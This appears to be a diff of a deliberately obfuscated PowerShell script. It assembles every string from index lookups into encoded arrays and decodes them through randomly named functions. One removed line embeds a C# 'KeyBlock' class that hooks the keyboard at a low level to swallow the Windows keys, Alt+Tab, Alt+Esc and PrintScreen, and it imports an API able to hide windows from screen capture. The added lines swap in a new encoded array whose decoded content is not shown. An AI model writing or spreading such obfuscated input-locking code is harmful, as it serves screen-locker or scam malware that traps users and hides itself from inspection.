-$JiRXrUdYJfeO = -join @($UFWPQCoizQlt[303], $UFWPQCoizQlt[347], $UFWPQCoizQlt[637], $UFWPQCoizQlt[14], $UFWPQCoizQlt[108], $UFWPQCoizQlt[260], $UFWPQCoizQlt[474], $UFWPQCoizQlt[333], $UFWPQCoizQlt[73], $UFWPQCoizQlt[340], $UFWPQCoizQlt[350], $UFWPQCoizQlt[329], $UFWPQCoizQlt[52], $UFWPQCoizQlt[653], $UFWPQCoizQlt[690], $UFWPQCoizQlt[598], $UFWPQCoizQlt[238], $UFWPQCoizQlt[566], $UFWPQCoizQlt[552], $UFWPQCoizQlt[150])
-$YOIKcOqDbXeP = -join @($UFWPQCoizQlt[509], $UFWPQCoizQlt[136], $UFWPQCoizQlt[398], $UFWPQCoizQlt[226], $UFWPQCoizQlt[453], $UFWPQCoizQlt[286], $UFWPQCoizQlt[434], $UFWPQCoizQlt[643])
-$mRIRBtfcRqNV = xYEfLAHsaMBd $JiRXrUdYJfeO $YOIKcOqDbXeP
-$BpqAlFQtmwoA = -join @($UFWPQCoizQlt[322], $UFWPQCoizQlt[704], $UFWPQCoizQlt[54], $UFWPQCoizQlt[368], $UFWPQCoizQlt[11], $UFWPQCoizQlt[316], $UFWPQCoizQlt[378])
-$pVHmdUKTOUkE = -join @($UFWPQCoizQlt[525], $UFWPQCoizQlt[6], $UFWPQCoizQlt[486], $UFWPQCoizQlt[301], $UFWPQCoizQlt[692], $UFWPQCoizQlt[419], $UFWPQCoizQlt[221], $UFWPQCoizQlt[375])
-$RztzwkkTCCZe = xYEfLAHsaMBd $BpqAlFQtmwoA $pVHmdUKTOUkE
-$FLAFhWMWObSm = -join @($UFWPQCoizQlt[550], $UFWPQCoizQlt[424], $UFWPQCoizQlt[535])
-$GfoMWkuEGmUq = -join @($UFWPQCoizQlt[684], $UFWPQCoizQlt[361], $UFWPQCoizQlt[209], $UFWPQCoizQlt[639], $UFWPQCoizQlt[91], $UFWPQCoizQlt[536], $UFWPQCoizQlt[669], $UFWPQCoizQlt[709])
-$WIsDzUeMIuEl = xYEfLAHsaMBd $FLAFhWMWObSm $GfoMWkuEGmUq
-$cYfxBaMJgcFd = -join @($UFWPQCoizQlt[185], $UFWPQCoizQlt[538], $UFWPQCoizQlt[596], $UFWPQCoizQlt[307], $UFWPQCoizQlt[287])
-$ZnqfCWOeAUNe = -join @($UFWPQCoizQlt[313], $UFWPQCoizQlt[679], $UFWPQCoizQlt[354], $UFWPQCoizQlt[416], $UFWPQCoizQlt[724], $UFWPQCoizQlt[607], $UFWPQCoizQlt[502], $UFWPQCoizQlt[699])
-$YekcWqWKNEmO = xYEfLAHsaMBd $cYfxBaMJgcFd $ZnqfCWOeAUNe
-$GVUVrYzzsMFB = -join @($UFWPQCoizQlt[476], $UFWPQCoizQlt[349], $UFWPQCoizQlt[207], $UFWPQCoizQlt[2])
-$SxACwEzSjlOf = -join @($UFWPQCoizQlt[461], $UFWPQCoizQlt[22], $UFWPQCoizQlt[685], $UFWPQCoizQlt[35], $UFWPQCoizQlt[105], $UFWPQCoizQlt[588], $UFWPQCoizQlt[597], $UFWPQCoizQlt[320])
-$xcdjQhfFTXAd = xYEfLAHsaMBd $GVUVrYzzsMFB $SxACwEzSjlOf
-$XCZDeqctQxGI = -join @($UFWPQCoizQlt[311], $UFWPQCoizQlt[235])
-$GWBHLBdZFymr = -join @($UFWPQCoizQlt[432], $UFWPQCoizQlt[498], $UFWPQCoizQlt[668], $UFWPQCoizQlt[173], $UFWPQCoizQlt[93], $UFWPQCoizQlt[459], $UFWPQCoizQlt[655], $UFWPQCoizQlt[24])
-$QoDWGwnIXcSR = xYEfLAHsaMBd $XCZDeqctQxGI $GWBHLBdZFymr
-$fseWSlYIpQYs = -join @($UFWPQCoizQlt[677], $UFWPQCoizQlt[490], $UFWPQCoizQlt[372])
-$kJgntCmUCEqP = -join @($UFWPQCoizQlt[79], $UFWPQCoizQlt[577], $UFWPQCoizQlt[586], $UFWPQCoizQlt[554], $UFWPQCoizQlt[131], $UFWPQCoizQlt[373], $UFWPQCoizQlt[736], $UFWPQCoizQlt[510])
-$aBaKGyzbqfXF = xYEfLAHsaMBd $fseWSlYIpQYs $kJgntCmUCEqP
-$XNfDvYXRZrgt = -join @($UFWPQCoizQlt[730], $UFWPQCoizQlt[614], $UFWPQCoizQlt[37])
-$CjCzFNoUdmwr = -join @($UFWPQCoizQlt[213], $UFWPQCoizQlt[644], $UFWPQCoizQlt[381], $UFWPQCoizQlt[551], $UFWPQCoizQlt[25], $UFWPQCoizQlt[230], $UFWPQCoizQlt[247], $UFWPQCoizQlt[621])
-$EAIpLmeWYvXg = xYEfLAHsaMBd $XNfDvYXRZrgt $CjCzFNoUdmwr
-$jXVWtcKxBayR = -join @($UFWPQCoizQlt[87])
-$YFbBfANuFiGC = -join @($UFWPQCoizQlt[48], $UFWPQCoizQlt[117], $UFWPQCoizQlt[271], $UFWPQCoizQlt[507], $UFWPQCoizQlt[138], $UFWPQCoizQlt[80], $UFWPQCoizQlt[43], $UFWPQCoizQlt[582])
-$sjHXtuIoxLdl = xYEfLAHsaMBd $jXVWtcKxBayR $YFbBfANuFiGC
-$aPIAtMEvGEPr = -join @($UFWPQCoizQlt[591], $UFWPQCoizQlt[318], $UFWPQCoizQlt[501], $UFWPQCoizQlt[583])
-$frIEVMNJrlPl = -join @($UFWPQCoizQlt[55], $UFWPQCoizQlt[339], $UFWPQCoizQlt[599], $UFWPQCoizQlt[590], $UFWPQCoizQlt[296], $UFWPQCoizQlt[277], $UFWPQCoizQlt[242], $UFWPQCoizQlt[512])
-$aOldueYORtLb = xYEfLAHsaMBd $aPIAtMEvGEPr $frIEVMNJrlPl
-$DNOhgwclaJrr = -join @($UFWPQCoizQlt[506], $UFWPQCoizQlt[471], $UFWPQCoizQlt[457])
-$MwwHuTJFwzSx = -join @($UFWPQCoizQlt[445], $UFWPQCoizQlt[376], $UFWPQCoizQlt[265], $UFWPQCoizQlt[387], $UFWPQCoizQlt[18], $UFWPQCoizQlt[151], $UFWPQCoizQlt[92], $UFWPQCoizQlt[153])
-$QQcPAfwkVdyE = xYEfLAHsaMBd $DNOhgwclaJrr $MwwHuTJFwzSx
-$RwXSqpEBhrpb = -join @($UFWPQCoizQlt[482], $UFWPQCoizQlt[77], $UFWPQCoizQlt[44], $UFWPQCoizQlt[309], $UFWPQCoizQlt[306])
-$RGiqBaiTKzhF = -join @($UFWPQCoizQlt[532], $UFWPQCoizQlt[523], $UFWPQCoizQlt[137], $UFWPQCoizQlt[695], $UFWPQCoizQlt[68], $UFWPQCoizQlt[250], $UFWPQCoizQlt[397], $UFWPQCoizQlt[417])
-$mbcTJjaUtQPS = xYEfLAHsaMBd $RwXSqpEBhrpb $RGiqBaiTKzhF
-$qELtxPuHFLXr = -join @($UFWPQCoizQlt[524], $UFWPQCoizQlt[516], $UFWPQCoizQlt[712])
-$KnVdOHyhxltL = -join @($UFWPQCoizQlt[325], $UFWPQCoizQlt[58], $UFWPQCoizQlt[305], $UFWPQCoizQlt[573], $UFWPQCoizQlt[430], $UFWPQCoizQlt[276], $UFWPQCoizQlt[353], $UFWPQCoizQlt[657])
-$qDQfXzWmlKXg = xYEfLAHsaMBd $qELtxPuHFLXr $KnVdOHyhxltL
-$jgirvsppDOXG = -join @($UFWPQCoizQlt[171], $UFWPQCoizQlt[608], $UFWPQCoizQlt[34], $UFWPQCoizQlt[99], $UFWPQCoizQlt[734], $UFWPQCoizQlt[336], $UFWPQCoizQlt[426])
-$suxeiJuDFTdu = -join @($UFWPQCoizQlt[388], $UFWPQCoizQlt[334], $UFWPQCoizQlt[132], $UFWPQCoizQlt[366], $UFWPQCoizQlt[8], $UFWPQCoizQlt[666], $UFWPQCoizQlt[545], $UFWPQCoizQlt[155])
-$oFdVNFKloKxG = xYEfLAHsaMBd $jgirvsppDOXG $suxeiJuDFTdu
-$HIYhcHvMVBhR = -join @($UFWPQCoizQlt[409], $UFWPQCoizQlt[227], $UFWPQCoizQlt[604])
-$cqIMQMUlwGMz = -join @($UFWPQCoizQlt[630], $UFWPQCoizQlt[15], $UFWPQCoizQlt[275], $UFWPQCoizQlt[197], $UFWPQCoizQlt[269], $UFWPQCoizQlt[548], $UFWPQCoizQlt[118], $UFWPQCoizQlt[572])
-$dpUpYyQcGNIy = xYEfLAHsaMBd $HIYhcHvMVBhR $cqIMQMUlwGMz
-$RRSIxkZUarhX = -join @($UFWPQCoizQlt[145])
-$cqmumOPiZswi = -join @($UFWPQCoizQlt[101], $UFWPQCoizQlt[465], $UFWPQCoizQlt[194], $UFWPQCoizQlt[183], $UFWPQCoizQlt[200], $UFWPQCoizQlt[357], $UFWPQCoizQlt[674], $UFWPQCoizQlt[65])
-$JYEBsTgwwYeg = xYEfLAHsaMBd $RRSIxkZUarhX $cqmumOPiZswi
-$ZaZSGzmwcTBI = -join @($UFWPQCoizQlt[546], $UFWPQCoizQlt[696])
-$DPKuDzPFyMJR = -join @($UFWPQCoizQlt[404], $UFWPQCoizQlt[74], $UFWPQCoizQlt[319], $UFWPQCoizQlt[240], $UFWPQCoizQlt[100], $UFWPQCoizQlt[714], $UFWPQCoizQlt[708], $UFWPQCoizQlt[16])
-$rSeZDHwlOAud = xYEfLAHsaMBd $ZaZSGzmwcTBI $DPKuDzPFyMJR
-$kOZZsEwHKBhy = -join @($UFWPQCoizQlt[218], $UFWPQCoizQlt[652], $UFWPQCoizQlt[567])
-$mDWoFjRjwCbw = -join @($UFWPQCoizQlt[195], $UFWPQCoizQlt[72], $UFWPQCoizQlt[7], $UFWPQCoizQlt[526], $UFWPQCoizQlt[331], $UFWPQCoizQlt[49], $UFWPQCoizQlt[475], $UFWPQCoizQlt[612])
-$mfKFAeoIfaQh = xYEfLAHsaMBd $kOZZsEwHKBhy $mDWoFjRjwCbw
-$fBnfgHYGKUEL = -join @($UFWPQCoizQlt[730], $UFWPQCoizQlt[342], $UFWPQCoizQlt[481], $UFWPQCoizQlt[635], $UFWPQCoizQlt[448])
-$pRbUTZSvPBQT = -join @($UFWPQCoizQlt[281], $UFWPQCoizQlt[610], $UFWPQCoizQlt[182], $UFWPQCoizQlt[624], $UFWPQCoizQlt[594], $UFWPQCoizQlt[574], $UFWPQCoizQlt[181], $UFWPQCoizQlt[505])
-$zokXhaNhrrlo = xYEfLAHsaMBd $fBnfgHYGKUEL $pRbUTZSvPBQT
-try { $flPcoEboIdtV = $flPcoEboIdtV | ConvertFrom-Json } catch { }
-$JxnpRmLSmbhK = 'using System; using System.Runtime.InteropServices; using System.Diagnostics; public class KeyBlock { private const int WH_KEYBOARD_LL = 13; private const int WM_KEYDOWN = 0x0100; private const int WM_SYSKEYDOWN = 0x0104; [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId); [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static extern bool UnhookWindowsHookEx(IntPtr hhk); [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam); [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll", SetLastError=true)] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId); [DllImport("user32.dll")] public static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity); public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam); private static LowLevelKeyboardProc _proc = HookCallback; private static IntPtr _hookID = IntPtr.Zero; public static void BlockKeys() { if (_hookID == IntPtr.Zero) { using (Process curProcess = Process.GetCurrentProcess()) using (ProcessModule curModule = curProcess.MainModule) { _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0); } } } public static void UnblockKeys() { if (_hookID != IntPtr.Zero) { UnhookWindowsHookEx(_hookID); _hookID = IntPtr.Zero; } } private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) { if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) { int vkCode = Marshal.ReadInt32(lParam); bool alt = (Marshal.ReadInt32(lParam, 8) & 32) != 0; if (vkCode == 91 || vkCode == 92) return (IntPtr)1; if (vkCode == 9 && alt) return (IntPtr)1; if (vkCode == 27 && alt) return (IntPtr)1; if (vkCode == 0x2C) return (IntPtr)1; } return CallNextHookEx(_hookID, nCode, wParam, lParam); } }'
+$OCfEmpwAWqCy = @("RxAX", "a51M", "5322", "yQhV", "60cf", "a3d9", "SE1F", "2352", "6d95", "ENEG", "UBVT", "W0QU", "uNUQ", "ClgP", "K41C", "UhxV", "11d8", "YdEY", "b1d5", "NUgQ", "50c2", "XFRF", "ZYRX", "cbe7", "BAUX", "1c54", "3206", "6a8a", "e448", "07c5", "a099", "79a9", "0afe", "WIRV", "ZEkX", "0cc2", "PUHG", "3183", "8ba9", "Lwwb", "7e9a", "0f37", "ddfb", "0574", "8bee", "/UmQ", "5826", "29d5", "ebe9", "RsBU", "e75e", "Up1V", "223b", "==gE", "3a75", "d1HM", "3392", "a36c", "77b3", "V0ER", "CEFc", "UR0Y", "e537", "TJxU", "0059", "c284", "fNQU", "54bb", "cAlF", "MdxX", "JNEX", "55fe", "IFkI", "BRCU", "386b", "vkRV", "dde2", "03cc", "XtEX", "RQ0A", "6982", "7881", "YRlD", "81ed", "7aa3", "0df1", "3994", "9cef", "VI1D", "6f99", "f37e", "bVgF", "f10E", "QMVI", "737c", "b0cc", "7331", "MgVX", "aQlS", "vMFB", "af78", "MNkW", "5bde", "52e5", "d7e2", "8c28", "==gc", "Dp2C", "f455", "2546", "6720", "82c1", "aa60", "T1AR", "W5lS", "dd37", "005b", "ce26", "X5VQ", "ShwY", "b6f1", "420f", "9162", "=skS", "19a2", "exQW", "56a3", "6ed8", "==AE", "c874", "a0e1", "mIkG", "a6cf", "3a61", "dc24", "atlF", "=oER", "VZBb", "WNUC", "12ee", "Ks0B", "==AX", "EEAU", "DwFV", "TJQV", "ZRlX", "ddEV", "K9lF", "clQX", "1c7e", "AgUT", "xY0U", "4sEV", "bf2b", "XFVA", "b710", "GBxR", "f0b8", "64bd", "3e38", "VswV", "SRxH", "b32a", "CpwW", "70a9", "uBhU", "e9aa", "045f", "4b9e", "04ee", "ee75", "AwUT", "9ce4", "JZFC", "==AT", "b3f9", "6f95", "SpVQ", "6d2f", "e92a", "cb09", "dVlU", "eadf", "2536", "2Mze", "6871", "KdlV", "ea45", "EdRH", "88a9", "SU0E", "RNRD", "+gAX", "Q91Q", "U0gE", "=MVT", "BUlQ", "f5AU", "cacb", "qpzB", "504b", "==wQ", "23fe", "417f", "MQRC", "aNgQ", "7948", "3a51", "DUVW", "L91P", "LBkB", "axiR", "GNSW", "e873", "e6fb", "b981", "8a01", "==wG", "333f", "5742", "ba33", "X0kX", "WpxI", "==wE", "SJwF", "aVxA", "WRFF", "Q0QQ", "OUUN", "9b92", "2167", "AZER", "StUX", "f8c4", "cc18", "b586", "OY1U", "U5kD", "Z5gW", "352c", "871c", "773e", "==QX", "2d57", "8e33", "2227", "HpQV", "C5QS", "61c3", "ff34", "VcBU", "a08e", "ABFM", "7bc4", "KJmO", "69c5", "2d39", "d91a", "SRUR", "CUlQ", "4b49", "162d", "1731", "OkUS", "0497", "19CC", "TclF", "7c9a", "5ce4", "2bbf", "LwwD", "a65f", "7837", "1c32", "BFxS", "e551", "e02c", "9209", "c000", "37ec", "7ea4", "ZQwF", "bf22", "f539", "Y51S", "TcmQ", "5d4f", "VgkE", "RxXb", "782f", "IA1F", "F8FG", "a6a9", "B51X", "ANUT", "TsFA", "a6d5", "7756", "Z9AY", "68DR", "D9VA", "a289", "315c", "VpgU", "44f6", "3daf", "Z1Qc", "d61b", "WBVF", "Xx1d", "fb50", "AcRV", "OYkF", "B1QC", "3db3", "e2f1", "323c", "AYwA", "c07d", "UUwX", "RdVU", "RcWG", "af7d", "eFwA", "=olU", "f9d7", "DwVD", "DkgM", "098a", "bb22", "d882", "a783", "3665", "b52e", "AAEb", "DV0J", "10f5", "bd06", "FBFT", "F1UT", "==QE", "a408", "3b83", "YNAH", "=YUE", "388b", "6e09", "W1QW", "3a63", "008d", "a80b", "+AgA", "56d3", "2b91", "9e68", "df29", "4932", "93c8", "de64", "7f25", "0cRX", "ANxY", "=QRR", "BJBF", "68bb", "W4FJ", "fRBV", "bYkF", "2ef8", "cb3f", "==AA", "hxVU", "54e7", "9984", "KZFe", "ddUZ", "RlEW", "9a59", "048a", "d741", "C9VC", "5dbd", "e502", "799e", "5f0b", "e211", "URFD", "rZ1V", "fb14", "+V2f", "CcFC", "32dd", "14cd", "cRhR", "2ad6", "=0QD", "NNxD", "4afd", "c88d", "20VQ", "e794", "CoVV", "de39", "eYwG", "16c1", "53d1", "5e3d", "==gD", "==wB", "9329", "316f", "fbc1", "4366", "7871", "SQFD", "7b5e", "23d5", "BdQb", "ShVG", "cplY", "84f6", "7753", "GQlR", "2c91", "KwiK", "e6f4", "6f6c", "TpVK", "7f99", "2651", "AQAX", "f420", "739c", "RURQ", "FllW", "+cgA", "ef1f", "=8DR", "U8FQ", "Y9kU", "/oQd", "6af5", "6a1f", "b098", "JwFC", "a0d7", "z9Uc", "1de1", "1212", "t9Qc", "MYwU", "da72", "f4ca", "bddf", "55e8", "EB1Y", "==QQ", "FdFU", "KIRR", "Bg1C", "9b90", "9915", "8822", "d137", "JtEX", "93e4", "JsQJ", "ea7b", "c5da", "c834", "3a8f", "fa5c", "bb47", "c105", "CpgW", "16cc", "QpVQ", "FdBU", "04eb", "KAAA", "DVEV", "MABY", "z5AW", "3194", "RclX", "f6f5", "UkFd", "lkhB", "b5f7", "TBUY", "485e", "HZxC", "Wk0Q", "DEBQ", "397d", "XR1D", "Mx0C", "aRUV", "FEFX", "5910", "a08d", "CE1a", "z4Ef", "16b7", "B1FZ", "a2d9", "09QW", "6887", "a247", "b613", "5d16", "1a4b", "UFFc", "e5a3", "9e25", "9a57", "8e07", "d09f", "5dfb", "GI0X", "0446", "4b2d", "118d", "04ed", "WAkA", "c904", "7f6d", "280b", "==wN", "WxwR", "5a8b", "b74e", "eafb", "03cb", "6879", "b1b6", "e5c8", "FEkV", "Y5gW", "085c", "=EVT", "WNVD", "QU0A", "0c99", "oNlf", "HAlC", "fd0V", "995f", "fbbd", "EBFQ", "WtwB", "3325", "ZZUR", "c145", "27f7", "LcxN", "79a8", "cplX", "Z5lN", "et0G", "251d", "c528", "bb9d", "17bb", "e623", "bbfc", "e7d4", "c8QF", "XtxU", "KNQD", "2e11", "fbc7", "dokT", "DQEF", "4c2f", "JQ1V", "6f5c", "BFxA", "C9VX", "cdBE", "3bfd", "TBgc", "xE0D", "AIVS", "VJAI", "dJxd", "6806", "FkgQ", "8c58", "b92d", "DtkU", "3867", "==wF", "EhwA", "441d", "07fa", "4a67", "H0UU", "VQkS", "923c", "ZlVT", "SRlV", "PQlW", "fd9c", "cNBC", "ElkY", "f352", "EARC", "708f", "8d96", "5fb7", "f679", "248a", "5E3B", "OgAQ", "LUVV", "4d9e", "Blke", "9311", "9EQA", "dZxQ", "aaf5", "5c46", "fAwA", "f873", "IIXT", "fbdb", "WdED", "L11d", "bc86", "2355", "WwVa", "FVBW", "SUED", "a43b", "X40B", "cpkX", "G91W", "edb5", "4fb9", "=ABU", "8ee3", "9bf1", "AJEe", "a411", "595a", "4970", "4603", "d9fe", "WYgF", "ebfb", "7504", "54c9", "kVUM", "34e6", "aJAW", "0edc", "Wo1A", "FFUH", "QQwQ", "f0c6", "SYxS", "d2b4", "84cd", "4ee4", "5cae", "670e", "44e3", "314f", "7276", "1d63", "exXF", "7a89", "CAVD", "cf75", "K1Fe", "9b1b", "OoVE", "QhQD", "a416", "3cd7", "6bc1", "c0lR", "a977", "8fa5", "073a", "RskU", "9a6b", "N0Qd", "U91R", "b36e", "4ca6", "1a59", "82c8", "b28f", "f488", "PkFC", "fcce", "ewAQ", "79bc", "QZ0H", "02e8", "c158", "UY0F", "nNFA", "Dh1Q", "H0lD", "1388", "fxQZ", "WREX", "f51e", "GogR", "743d", "gp1U", "AlGO", "FgAC", "AE3M", "1df2", "Fs0F", "e2c6", "8dff", "O01W", "685d", "==wR", "e6c7", "415e", "8146", "alHZ", "7b74", "8235", "a3ae", "8ccd", "==gR", "V5BB", "ef7a", "c097", "af9a", "PQxB", "RglC", "40GU", "VYhH", "efe6", "5dbe", "GVlU", "/hRE", "Cl1W", "Q1FQ", "W9kR", "78bf", "LIwV", "45c8")
+$lMjEQOAPlYOm = -join @($OCfEmpwAWqCy[136], $OCfEmpwAWqCy[418], $OCfEmpwAWqCy[113], $OCfEmpwAWqCy[343], $OCfEmpwAWqCy[171], $OCfEmpwAWqCy[573], $OCfEmpwAWqCy[496])
+$MjgBrhvUqfPd = -join @($OCfEmpwAWqCy[398], $OCfEmpwAWqCy[699], $OCfEmpwAWqCy[638], $OCfEmpwAWqCy[596], $OCfEmpwAWqCy[666], $OCfEmpwAWqCy[85], $OCfEmpwAWqCy[20], $OCfEmpwAWqCy[286])
+$FPAsyJGdmqFV = sDmYimBhjKXw $lMjEQOAPlYOm $MjgBrhvUqfPd
+$PmQkGxzdKzLB = -join @($OCfEmpwAWqCy[528], $OCfEmpwAWqCy[265], $OCfEmpwAWqCy[502], $OCfEmpwAWqCy[396], $OCfEmpwAWqCy[55], $OCfEmpwAWqCy[321], $OCfEmpwAWqCy[615], $OCfEmpwAWqCy[581], $OCfEmpwAWqCy[613], $OCfEmpwAWqCy[107], $OCfEmpwAWqCy[317], $OCfEmpwAWqCy[482], $OCfEmpwAWqCy[99], $OCfEmpwAWqCy[446], $OCfEmpwAWqCy[587], $OCfEmpwAWqCy[607], $OCfEmpwAWqCy[653], $OCfEmpwAWqCy[351], $OCfEmpwAWqCy[228], $OCfEmpwAWqCy[544], $OCfEmpwAWqCy[716], $OCfEmpwAWqCy[101], $OCfEmpwAWqCy[444], $OCfEmpwAWqCy[237], $OCfEmpwAWqCy[450], $OCfEmpwAWqCy[479], $OCfEmpwAWqCy[154], $OCfEmpwAWqCy[498], $OCfEmpwAWqCy[749], $OCfEmpwAWqCy[390], $OCfEmpwAWqCy[34], $OCfEmpwAWqCy[148], $OCfEmpwAWqCy[226], $OCfEmpwAWqCy[698], $OCfEmpwAWqCy[311], $OCfEmpwAWqCy[91], $OCfEmpwAWqCy[627], $OCfEmpwAWqCy[24], $OCfEmpwAWqCy[718], $OCfEmpwAWqCy[458], $OCfEmpwAWqCy[221])
+$kHfMiQkEskXa = -join @($OCfEmpwAWqCy[255], $OCfEmpwAWqCy[500], $OCfEmpwAWqCy[634], $OCfEmpwAWqCy[561], $OCfEmpwAWqCy[695], $OCfEmpwAWqCy[130], $OCfEmpwAWqCy[553], $OCfEmpwAWqCy[606])
+$EVldgYZprkpt = sDmYimBhjKXw $PmQkGxzdKzLB $kHfMiQkEskXa
+$CbYGJTuwSohP = -join @($OCfEmpwAWqCy[592], $OCfEmpwAWqCy[474], $OCfEmpwAWqCy[655], $OCfEmpwAWqCy[36], $OCfEmpwAWqCy[125], $OCfEmpwAWqCy[15], $OCfEmpwAWqCy[464], $OCfEmpwAWqCy[657], $OCfEmpwAWqCy[399], $OCfEmpwAWqCy[625], $OCfEmpwAWqCy[236], $OCfEmpwAWqCy[69], $OCfEmpwAWqCy[519], $OCfEmpwAWqCy[677], $OCfEmpwAWqCy[258], $OCfEmpwAWqCy[597], $OCfEmpwAWqCy[300], $OCfEmpwAWqCy[635], $OCfEmpwAWqCy[339], $OCfEmpwAWqCy[312], $OCfEmpwAWqCy[491])
+$MZozvxzZFnfj = -join @($OCfEmpwAWqCy[369], $OCfEmpwAWqCy[67], $OCfEmpwAWqCy[428], $OCfEmpwAWqCy[611], $OCfEmpwAWqCy[516], $OCfEmpwAWqCy[267], $OCfEmpwAWqCy[404], $OCfEmpwAWqCy[180])
+$AeXWFsWYMBBf = sDmYimBhjKXw $CbYGJTuwSohP $MZozvxzZFnfj
+$astNitPXlQmU = -join @($OCfEmpwAWqCy[437], $OCfEmpwAWqCy[51], $OCfEmpwAWqCy[434], $OCfEmpwAWqCy[363], $OCfEmpwAWqCy[6], $OCfEmpwAWqCy[537], $OCfEmpwAWqCy[740], $OCfEmpwAWqCy[98], $OCfEmpwAWqCy[376], $OCfEmpwAWqCy[188], $OCfEmpwAWqCy[649], $OCfEmpwAWqCy[19], $OCfEmpwAWqCy[671], $OCfEmpwAWqCy[433], $OCfEmpwAWqCy[186], $OCfEmpwAWqCy[191], $OCfEmpwAWqCy[137])
+$OiTNnxcIXiCK = -join @($OCfEmpwAWqCy[712], $OCfEmpwAWqCy[341], $OCfEmpwAWqCy[423], $OCfEmpwAWqCy[413], $OCfEmpwAWqCy[626], $OCfEmpwAWqCy[203], $OCfEmpwAWqCy[206], $OCfEmpwAWqCy[46])
+$RssUyjNYVftj = sDmYimBhjKXw $astNitPXlQmU $OiTNnxcIXiCK
+$XkkPQafdJvry = -join @($OCfEmpwAWqCy[723], $OCfEmpwAWqCy[14], $OCfEmpwAWqCy[250], $OCfEmpwAWqCy[9], $OCfEmpwAWqCy[682], $OCfEmpwAWqCy[70], $OCfEmpwAWqCy[493], $OCfEmpwAWqCy[21], $OCfEmpwAWqCy[477], $OCfEmpwAWqCy[393], $OCfEmpwAWqCy[334])
+$UCedrnAJqQAa = -join @($OCfEmpwAWqCy[465], $OCfEmpwAWqCy[594], $OCfEmpwAWqCy[741], $OCfEmpwAWqCy[368], $OCfEmpwAWqCy[469], $OCfEmpwAWqCy[571], $OCfEmpwAWqCy[518], $OCfEmpwAWqCy[717])
+$VzCmztwSZKgZ = sDmYimBhjKXw $XkkPQafdJvry $UCedrnAJqQAa
+$BbjtmGlHxjwK = -join @($OCfEmpwAWqCy[259], $OCfEmpwAWqCy[430], $OCfEmpwAWqCy[700], $OCfEmpwAWqCy[602], $OCfEmpwAWqCy[633], $OCfEmpwAWqCy[231], $OCfEmpwAWqCy[489])
+$waDpPsfcKkif = -join @($OCfEmpwAWqCy[412], $OCfEmpwAWqCy[660], $OCfEmpwAWqCy[57], $OCfEmpwAWqCy[249], $OCfEmpwAWqCy[112], $OCfEmpwAWqCy[388], $OCfEmpwAWqCy[680], $OCfEmpwAWqCy[314])
+$evsOLuiKgKql = sDmYimBhjKXw $BbjtmGlHxjwK $waDpPsfcKkif
+$PAVrDAeeMZrw = -join @($OCfEmpwAWqCy[408], $OCfEmpwAWqCy[706], $OCfEmpwAWqCy[193], $OCfEmpwAWqCy[79], $OCfEmpwAWqCy[118], $OCfEmpwAWqCy[661], $OCfEmpwAWqCy[637], $OCfEmpwAWqCy[689], $OCfEmpwAWqCy[361])
+$FWaqSJScbqDe = -join @($OCfEmpwAWqCy[41], $OCfEmpwAWqCy[110], $OCfEmpwAWqCy[74], $OCfEmpwAWqCy[668], $OCfEmpwAWqCy[253], $OCfEmpwAWqCy[676], $OCfEmpwAWqCy[674], $OCfEmpwAWqCy[275])
+$XYnCKOoXiaOO = sDmYimBhjKXw $PAVrDAeeMZrw $FWaqSJScbqDe
+$CpeEhVnbLntE = -join @($OCfEmpwAWqCy[181], $OCfEmpwAWqCy[744], $OCfEmpwAWqCy[138], $OCfEmpwAWqCy[628])
+$scRSPfcmkNkQ = -join @($OCfEmpwAWqCy[345], $OCfEmpwAWqCy[556], $OCfEmpwAWqCy[707], $OCfEmpwAWqCy[243], $OCfEmpwAWqCy[352], $OCfEmpwAWqCy[330], $OCfEmpwAWqCy[235], $OCfEmpwAWqCy[630])
+$auAVukDQgacs = sDmYimBhjKXw $CpeEhVnbLntE $scRSPfcmkNkQ
+$tflsYRnERGFt = -join @($OCfEmpwAWqCy[106], $OCfEmpwAWqCy[389])
+$QrYKqMdRZDLR = -join @($OCfEmpwAWqCy[669], $OCfEmpwAWqCy[279], $OCfEmpwAWqCy[648], $OCfEmpwAWqCy[245], $OCfEmpwAWqCy[406], $OCfEmpwAWqCy[421], $OCfEmpwAWqCy[302], $OCfEmpwAWqCy[442])
+$yIYwfAyRiWTz = sDmYimBhjKXw $tflsYRnERGFt $QrYKqMdRZDLR
+$oxyYkmdDMQqp = -join @($OCfEmpwAWqCy[696], $OCfEmpwAWqCy[210], $OCfEmpwAWqCy[12], $OCfEmpwAWqCy[246], $OCfEmpwAWqCy[708])
+$qKGYhIxRmlTk = -join @($OCfEmpwAWqCy[570], $OCfEmpwAWqCy[276], $OCfEmpwAWqCy[105], $OCfEmpwAWqCy[292], $OCfEmpwAWqCy[346], $OCfEmpwAWqCy[586], $OCfEmpwAWqCy[697], $OCfEmpwAWqCy[216])
+$USOVTQmODpwN = sDmYimBhjKXw $oxyYkmdDMQqp $qKGYhIxRmlTk
+$JzmgvSePqiXM = -join @($OCfEmpwAWqCy[184])
+$KNwxRhQEZKTa = -join @($OCfEmpwAWqCy[731], $OCfEmpwAWqCy[318], $OCfEmpwAWqCy[392], $OCfEmpwAWqCy[691], $OCfEmpwAWqCy[510], $OCfEmpwAWqCy[126], $OCfEmpwAWqCy[329], $OCfEmpwAWqCy[736])
+$KtGfTDwQhPCM = sDmYimBhjKXw $JzmgvSePqiXM $KNwxRhQEZKTa
+$IoqKHLgknFBN = -join @($OCfEmpwAWqCy[347], $OCfEmpwAWqCy[250], $OCfEmpwAWqCy[360], $OCfEmpwAWqCy[60])
